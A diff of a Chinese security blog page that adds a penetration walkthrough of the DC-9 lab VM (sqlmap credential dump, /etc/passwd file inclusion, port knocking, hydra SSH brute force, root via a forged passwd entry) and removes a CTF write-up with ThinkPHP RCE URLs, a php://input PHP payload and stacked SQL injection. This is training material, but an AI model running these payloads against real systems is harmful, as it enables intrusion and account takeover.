@@ -152,6 +152,165 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-DC9靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/28/DC9%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">DC9靶机渗透记录</a>
+    </h1>
+  
+
+        
+        <a href="/2021/02/28/DC9%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
+  	<time datetime="2021-02-28T08:41:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <center>DC9靶机渗透记录</center>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老套路了，还是直接上图</p>
+<p><img src="/images/image-20210228141847887.png" alt="image-20210228141847887"></p>
+<p>目标靶机ip<code>192.168.8.122</code>，本机ip<code>192.168.8.121</code></p>
+<p><img src="/images/image-20210228142057510.png" alt="image-20210228142057510"></p>
+<p>22和80端口（奇怪的是这里22端口被折叠了），apache中间件，Debian系统，访问一下其web服务</p>
+<p><img src="/images/image-20210228142325456.png" alt="image-20210228142325456"></p>
+<p>一时间没看出来是什么CMS</p>
+<p><img src="/images/image-20210228142614588.png" alt="image-20210228142614588"></p>
+<p>目录扫描给的结果也十分简略</p>
+<p><img src="/images/image-20210228142733412.png" alt="image-20210228142733412"></p>
+<h2 id="发现利用点"><a href="#发现利用点" class="headerlink" title="发现利用点"></a>发现利用点</h2><p><code>/includes</code>目录有一个信息泄露但并没有什么卵用。但是在主页面的Search中，可以检索Display All Record的用户，也即与数据库存在交互，但是搜索的结果为<code>/result.php</code>说明不是Get传参，而是Post！有了个思路了，我们打开burpsuite</p>
+<p><img src="/images/image-20210228143300834.png" alt="image-20210228143300834"></p>
+<p>果然，Post传参，变量为search，那说明在这个位置可能存在sql注入</p>
+<p><img src="/images/image-20210228143802832.png" alt="image-20210228143802832"></p>
+<p>果然，当我测了几种注入就出来了前面的所有信息，那接下来，懒人用法：sqlmap！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u http://192.168.8.122/results.php --data &quot;search=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210228144145763.png" alt="image-20210228144145763"></p>
+<p>很快就爆出来了库名儿</p>
+<p>忙猜一波Staff库，users可能是web页面上的哪些信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u http://192.168.8.122/results.php --data &quot;search=1&quot; -D Staff -T Users -C Username,Password --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210228144606539.png" alt="image-20210228144606539"></p>
+<p>对此我只能说sqlmap真香啊！还自带MD5解码，呜呜呜太贴心了</p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin</td>
+<td>856f5de590ef37314e7c3bdf6f8a66dc (transorbital1)</td>
+</tr>
+</tbody></table>
+<p>不说了，直接管理员账号登录呜呜呜</p>
+<p><img src="/images/image-20210228145150795.png" alt="image-20210228145150795"></p>
+<p>登录上去后在Manage页面下方，有一个<code>File does not exist</code>的话语，好生熟悉哇！这不就。。。文件包含漏洞？</p>
+<p>构造Get传参，使用burpsuite爆破变量名称</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/manage.php?$cat$=../../../../etc/passwd</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210228151117006.png" alt="image-20210228151117006"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:105:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">marym:x:1001:1001:Mary Moe:&#x2F;home&#x2F;marym:&#x2F;bin&#x2F;bash</span><br><span class="line">julied:x:1002:1002:Julie Dooley:&#x2F;home&#x2F;julied:&#x2F;bin&#x2F;bash</span><br><span class="line">fredf:x:1003:1003:Fred Flintstone:&#x2F;home&#x2F;fredf:&#x2F;bin&#x2F;bash</span><br><span class="line">barneyr:x:1004:1004:Barney Rubble:&#x2F;home&#x2F;barneyr:&#x2F;bin&#x2F;bash</span><br><span class="line">tomc:x:1005:1005:Tom Cat:&#x2F;home&#x2F;tomc:&#x2F;bin&#x2F;bash</span><br><span class="line">jerrym:x:1006:1006:Jerry Mouse:&#x2F;home&#x2F;jerrym:&#x2F;bin&#x2F;bash</span><br><span class="line">wilmaf:x:1007:1007:Wilma Flintstone:&#x2F;home&#x2F;wilmaf:&#x2F;bin&#x2F;bash</span><br><span class="line">bettyr:x:1008:1008:Betty Rubble:&#x2F;home&#x2F;bettyr:&#x2F;bin&#x2F;bash</span><br><span class="line">chandlerb:x:1009:1009:Chandler Bing:&#x2F;home&#x2F;chandlerb:&#x2F;bin&#x2F;bash</span><br><span class="line">joeyt:x:1010:1010:Joey Tribbiani:&#x2F;home&#x2F;joeyt:&#x2F;bin&#x2F;bash</span><br><span class="line">rachelg:x:1011:1011:Rachel Green:&#x2F;home&#x2F;rachelg:&#x2F;bin&#x2F;bash</span><br><span class="line">rossg:x:1012:1012:Ross Geller:&#x2F;home&#x2F;rossg:&#x2F;bin&#x2F;bash</span><br><span class="line">monicag:x:1013:1013:Monica Geller:&#x2F;home&#x2F;monicag:&#x2F;bin&#x2F;bash</span><br><span class="line">phoebeb:x:1014:1014:Phoebe Buffay:&#x2F;home&#x2F;phoebeb:&#x2F;bin&#x2F;bash</span><br><span class="line">scoots:x:1015:1015:Scooter McScoots:&#x2F;home&#x2F;scoots:&#x2F;bin&#x2F;bash</span><br><span class="line">janitor:x:1016:1016:Donald Trump:&#x2F;home&#x2F;janitor:&#x2F;bin&#x2F;bash</span><br><span class="line">janitor2:x:1017:1017:Scott Morrison:&#x2F;home&#x2F;janitor2:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+
+<p>显然变量名仍然为<code>file</code>，然后写入报错日志，就像之前的一样吗，但是访问了一下发现，该靶机并无法访问日志（不是nginx），所以思路要向挂马方向转变。以上是<code>/etc/passwd</code>的用户信息，可以看出来有很多很多，突然想起一个细节，，，我爆数据库时候没细看其他库名儿。。。</p>
+<p><img src="/images/image-20210228153032625.png" alt="image-20210228153032625"></p>
+<p>果然啊，在其他库里发现了这些用户信息，失算了。。。</p>
+<p>之后是ssh爆破了，不过显然，之前的信息22端口折叠了，这里真的是断思路了。只好求助谷歌爸爸，搜索发现这是端口保护机制，首先访问一下<code>/etc/knockd.conf</code>文件</p>
+<p><img src="/images/image-20210228153536493.png" alt="image-20210228153536493"></p>
+<p>端口敲门，依次访问7469，8475，9842这几个端口，即可打开22端口，直接nc连接进行敲击</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.8.122 7469</span><br><span class="line">nc 192.168.8.122 8475</span><br><span class="line">nc 192.168.8.122 9842</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210228154006222.png" alt="image-20210228154006222"></p>
+<p>有结果可见，ssh的22端口变为开放状态，那就hydra爆破吧！(。。。用户名儿和密码的字典里不要有空格，，，)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L DC9-user.txt -P DC9-pwd.txt 192.168.8.122 ssh</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210228154653692.png" alt="image-20210228154653692"></p>
+<p>使用janitor用户登录，在他的<code>/home/janitor</code>文件夹发现了<code>.secrets-for-putin</code>文件，里面有一个密码本</p>
+<p><img src="/images/image-20210228155333657.png" alt="image-20210228155333657"></p>
+<p>使用了<code>sudo -l</code>后发现该用户并无无密码权限</p>
+<p>那继续换人爆破</p>
+<p><img src="/images/image-20210228155813500.png" alt="image-20210228155813500"></p>
+<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>加入新密码后又爆破出来了一个账号，使用<code>fredf:B4-Tru3-001</code>登录</p>
+<p><img src="/images/image-20210228160027751.png" alt="image-20210228160027751"></p>
+<p>该用户具有无密码的root权限</p>
+<p><img src="/images/image-20210228160219128.png" alt="image-20210228160219128"></p>
+<p>以防万一，也查了一下SUID提权，发现不太熟悉，不如直接走预期解</p>
+<p><img src="/images/image-20210228160535718.png" alt="image-20210228160535718"></p>
+<p>运行该文件，发现需要一个test.py的python程序。找吧</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210228160759405.png" alt="image-20210228160759405"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>py文件的含义为：<code>读取参数1的内容，然后将参数1的内容写入到参数2的内容中。</code></p>
+<p>那我们可以构造一个root权限用户，将该用户信息写入文件内，将改文件作为参数1，<code>/etc/passwd</code>作为参数2，这样就创建了一个root权限用户，就能实现提权了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7c721bdaf34b">链接</a></p>
+</blockquote>
+<p>首先，仿照<code>/etc/passwd</code>格式生成一个root用户文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt admin 123456</span><br><span class="line">-1 的意思是使用md5加密算法</span><br><span class="line">-salt 自动插入一个随机数作为文件内容加密</span><br><span class="line">admin 123456 用户名和密码</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/shell</span><br><span class="line">    <span class="comment"># 用户名:密码:uid:gid:家目录:登陆后使用的shell</span></span><br><span class="line">    </span><br><span class="line">sudo ./<span class="built_in">test</span> /tmp/shell /etc/passwd </span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20210228162335447.png" alt="image-20210228162335447"></p>
+<p>OK！</p>
+<p><img src="/images/image-20210228162414289.png" alt="image-20210228162414289"></p>
+<p>莫名又有点小伤感了</p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>呼，至此DC系列结束了XD</p>
+<p>很好玩，学到了很多很多很多！</p>
+<p>但是，自己的基础知识太差了，接下来会恶补基础知识吧！</p>
+<p>加油！</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/02/28/DC9%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DC8靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1408,151 +1567,6 @@ include($_GET[test]);
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/01/30/gdb%E8%B0%83%E8%AF%95/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-web-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/28/web-1/">web-1</a>
-    </h1>
-  
-
-        
-        <a href="/2021/01/28/web-1/" class="archive-article-date">
-  	<time datetime="2021-01-27T17:23:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <center>Web-高手进阶-攻防世界</center>
-
-<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php-rce"></a>php-rce</h2><p>由其页面信息可得其为<code>ThinkPHP 5.x</code>框架，又由题目名字显然其让我们利用CMS漏洞打入，直接msf搜索利用</p>
-<p><img src="/images/image-20210128012700939.png" alt="image-20210128012700939"></p>
-<p>设置好攻击载荷和RHOSTS以及LHOST等参数后，执行exploit，很奇怪，msf执行成功但是却并未回弹任何shell，有如下推测。</p>
-<p><img src="/images/image-20210128014220310.png" alt="image-20210128014220310"></p>
-<ul>
-<li>一是对方网页布置在一个docker里，有保护机制防止服务器被日穿</li>
-<li>二是我设置的LHOST并不是一个公网ip，很可能无法回弹shell</li>
-</ul>
-<p>可以用有公网ip的VPS部署msf试试来验证猜想（我也有，留待日后验证），回过头来解题，搜索该版本漏洞利用和对应payload</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br><span class="line">#当前目录</span><br><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../../</span><br><span class="line">#上级目录，在上级一次发现了一个flag的目录，于是输入</span><br><span class="line">http://111.200.241.243:50986/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag</span><br></pre></td></tr></table></figure>
-<p>即可得到</p>
-<p><img src="/images/image-20210128015103215.png" alt="image-20210128015103215"></p>
-<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>打开场景是一段php代码，如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>查阅相关资料得知：**<code>php://input</code> 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。**而<code>strstr()</code>函数可以通过大小写绕过。所以打开burpsuit，由上述php代码可知我们要构造GET参数传递page，所以有：设置请求头<code>GET /?page=PHP://input HTTP/1.1</code>。传递内容：<code>&lt;?php system(&quot;ls&quot;); ?&gt; </code>回传即内容。要注意相关shell操作要用system()函数调用。</p>
-<p><img src="/images/image-20210128222202545.png" alt="image-20210128222202545"></p>
-<p><img src="/images/image-20210128222612588.png" alt="image-20210128222612588"></p>
-<h2 id="suppersqli"><a href="#suppersqli" class="headerlink" title="suppersqli"></a>suppersqli</h2><p>sql注入经典题目了</p>
-<ul>
-<li>直接sqlmap一把梭</li>
-<li>认真分析手注</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> sqlmap python3 sqlmap.py -u &lt;url&gt;/？<span class="built_in">id</span>=<span class="number">1</span> --dbs                             <span class="comment">#查询数据库的库名</span></span><br><span class="line"><span class="number">2</span>、sqlmap python3 sqlmap.py -u &lt;url&gt; -D 数据库名 --tables                      <span class="comment">#查询数据库的表名</span></span><br><span class="line"><span class="number">3</span>、sqlmap python3 sqlmap.py -u &lt;url&gt; -D 数据库名 -T 表名 --column              <span class="comment">#查找字段</span></span><br><span class="line"><span class="number">4</span>、sqlmap python3 sqlmap.py -u &lt;url&gt; -D 数据库名 -T 表名 -C flag --dump        <span class="comment">#可显示flag</span></span><br></pre></td></tr></table></figure>
-<p>但是！sqlmap暴毙了，查询出了数据库但是并没有查出来tables，因为该注入方式在sqlmap里需要跑common-tables.txt表，对方表名不走寻常路QAQ。</p>
-<p>So，转换思路，来考虑手注。首先判断该出存在sql注入点。</p>
-<p>这里参考一篇很棒的博文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Vinson404/p/7253255.html">我是链接</a></p>
-<blockquote>
-<p>1’不回显而1’#正常显示</p>
-</blockquote>
-<p>这里考虑要先爆出库名，所以得使用语句<code>show databases;</code>无意中尝试发现，当前一句结束后后续语句仍能发挥作用，查询后发现这种注入叫做<strong>堆叠注入</strong>。所以构造<code>/?inject=1&#39;;show databases;</code>可得出数据库名。</p>
-<p>这里有个坑，<strong>字符串做表名时候要加反引号！</strong></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show columns from `1919114514`;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210129011414816.png" alt="image-20210129011414816"></p>
-<p>好了，问题又出现了，因为限制了<code>select</code>等句子，我们无法查看<code>flag</code>列，这里借鉴了大佬们的思路。</p>
-<p><img src="/images/00D989C2.jpg" alt="img"></p>
-<h3 id="方法一：使用handler"><a href="#方法一：使用handler" class="headerlink" title="方法一：使用handler"></a>方法一：使用handler</h3><p>mysql里，使用handler进行查询：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE </span><br></pre></td></tr></table></figure>
-<p>因此有：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20210129012504472.png" alt="image-20210129012504472"></p>
-<h3 id="方法三：预处理"><a href="#方法三：预处理" class="headerlink" title="方法三：预处理"></a>方法三：预处理</h3><p>首先我们需要知道下列知识：<br> <strong><em>用户变量和set语句：</em></strong></p>
-<p><strong>用户变量</strong>即用户自己定义的变量，我们可以给用户变量分配值，并且可用在任何可以正常使用标量表达式的地方。<br> 引入用户变量之前我们必须使用set语句或select语句来定义它，然后为它赋一个值，否则变量就只有一个空值。<br> 用户变量与连接有关。也就是说，一个客户端定义的变量不能被其它客户端看到或使用。当客户端退出时，该客户端连接的所有变量将自动释放。</p>
-<p>set语句可用于向系统变量或用户变量赋值，针对用户变量的定义如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET @var_name &#x3D; expr [, @var_name &#x3D; expr] ...</span><br></pre></td></tr></table></figure>
-<p>也可使用select语句来定义：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @var_name :&#x3D; expr [, @var_name &#x3D; expr] ...</span><br></pre></td></tr></table></figure>
-<p>用户变量：以”@“开始，形式为”@var_name”,以区分用户变量及列名。它可以是任何随机的，复合的标量表达式，只要其中没有列指定。<br> 一个变量名可以由当前字符集的数字字母字符和“_”、“$”和“.”组成。缺省字符集是ISO-8859-1 Latin1；这可以用mysqld 的–default-character-set 选项更改字符集。<br> 对于SET，可以使用=或:=来赋值，对于SELECT只能使用:=来赋值。<br> 我们可以使用一条简单的select语句查询定义的用户变量的值。</p>
-<p><strong>Prepare语句：</strong></p>
-<p><code>prepare</code>语句利用客户端/服务器二进制协议。 它将包含占位符(<code>?</code>)的查询传递给MySQL服务器，如下例所示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT * </span><br><span class="line">FROM products </span><br><span class="line">WHERE productCode &#x3D; ?;</span><br><span class="line">SQL</span><br></pre></td></tr></table></figure>
-<p>当MySQL使用不同的<code>productcode</code>值执行此查询时，不必完全解析查询。 因此，这有助于MySQL更快地执行查询，特别是当MySQL多次执行查询时。 因为<code>prepare</code>语句使用占位符(<code>?</code>)，这有助于避免SQL注入的问题，从而使您的应用程序更安全一些。</p>
-<p>我们来看一下使用MySQL PREPARE语句的例子。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt1 FROM &#39;SELECT productCode, productName</span><br><span class="line">                    FROM products</span><br><span class="line">                    WHERE productCode &#x3D; ?&#39;;</span><br><span class="line"></span><br><span class="line">SET @pc &#x3D; &#39;S10_1678&#39;;</span><br><span class="line">EXECUTE stmt1 USING @pc;</span><br><span class="line"></span><br><span class="line">DEALLOCATE PREPARE stmt1;</span><br><span class="line">SQL</span><br></pre></td></tr></table></figure>
